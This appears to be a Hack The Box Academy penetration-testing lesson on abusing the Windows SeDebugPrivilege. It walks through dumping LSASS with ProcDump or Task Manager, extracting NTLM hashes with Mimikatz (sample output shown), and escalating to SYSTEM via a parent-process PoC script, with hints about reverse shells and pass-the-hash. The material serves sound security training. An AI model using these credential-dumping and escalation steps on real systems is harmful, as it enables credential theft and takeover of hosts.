To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.

During an internal penetration test, it is often helpful to use websites such as LinkedIn to gather information about potential users to target. Suppose we are, for example, retrieving many NTLMv2 password hashes using `Responder` or `Inveigh`. In that case, we may want to focus our password hash cracking efforts on possible high-value accounts, such as developers who are more likely to have these types of privileges assigned to their accounts. A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.

![image](https://academy.hackthebox.com/storage/modules/67/debug.png)

After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.

SeDebugPrivilege

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.

SeDebugPrivilege

```cmd-session
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).

Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

SeDebugPrivilege

```cmd-session
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>

```

Suppose we are unable to load tools on the target for whatever reason but have RDP access. In that case, we can take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`. After downloading this file back to our attack system, we can process it using Mimikatz the same way as the previous example.

![image](https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png)

---

## Remote Code Execution as SYSTEM

We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and using the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of a [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let's see this in action.

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

The PoC script has received an update. Please visit its GitHub repository and review its usage. https://github.com/decoder-it/psgetsystem

First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.

SeDebugPrivilege

```powershell-session
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_winlogon.png)

We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with `SeDebugPrivilege`. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that's outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.